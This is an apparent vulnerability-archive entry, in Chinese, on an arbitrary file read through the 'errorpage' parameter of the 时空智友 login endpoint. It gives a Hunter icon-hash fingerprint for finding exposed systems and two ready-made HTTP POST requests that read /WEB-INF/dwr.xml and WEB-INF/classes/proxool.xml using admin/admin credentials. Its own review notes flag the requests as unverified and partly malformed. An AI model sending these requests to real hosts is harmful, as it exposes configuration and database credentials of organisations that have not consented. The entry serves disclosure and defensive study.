---
source: "wy876 漏洞文库"
title: "时空智友 login errorpage任意资源读取"
product: "时空智友"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本"
prerequisites: "错误登录返回路径，未说明登录是否要失败"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ln06lr49a314ww79"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B/%E6%97%B6%E7%A9%BA%E6%99%BA%E5%8F%8B%E4%BC%81%E4%B8%9A%E6%B5%81%E7%A8%8B%E5%8C%96%E7%AE%A1%E6%8E%A7%E7%B3%BB%E7%BB%9Flogin%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.icon=="
hunter: "web.icon==\"2464cbce5dd2681dd4fb62d055520d78\""
id: "vw-32ae715f8f7279ddfaeb1094"
entity_id: "ve-32ae715f8f7279ddfaeb1094"
schema_version: "1"
---

# 时空智友 login errorpage任意资源读取

## 条目说明

- 对象与具体问题：时空智友；login errorpage任意资源读取
- 版本、配置及部署条件：无版本
- 认证与权限前提：错误登录返回路径，未说明登录是否要失败
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 两个变体路径前斜线不同需保留，可能内部转发而非任意OS文件读取
- User-Agent被拆行，Accept-Encoding gzi残缺，固定Content-Length
- 无返回内容/根因/修复

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
时空智友企业流程化管控系统是一个用于企业流程管理和控制的软件系统。它旨在帮助企业实现流程的规范化、自动化和优化，从而提高工作效率、降低成本并提升管理水平。时空智友企业流程化管控系统login 文件读取漏洞，攻击者可利用该漏洞获取系统的敏感信息等。

## 二、影响版本
+ 时空智友企业流程化管控系统

## 三、资产测绘
+ hunter`web.icon=="2464cbce5dd2681dd4fb62d055520d78"`
+ 登录页面


## 四、漏洞复现
```http
POST /login HTTP/1.1
Host: xx.xx.xx.xx
Content-Length: 100
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) 
AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

op=verify%7Clogin&targetpage=&errorpage=/WEB-INF/dwr.xml&mark=&tzo=480&username=admin&password=admin
```


```http
POST /login HTTP/1.1
Host: XX.XX.XX.XX
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzi

op=verify%7Clogin&targetpage=&errorpage=WEB-INF/classes/proxool.xml&mark=&tzo=480&username=admin&password=admin
```

> 请求长度说明：原资料 Content-Length 为 111；静态长度已移除，应由客户端根据最终请求体的字节数生成。


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ln06lr49a314ww79>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
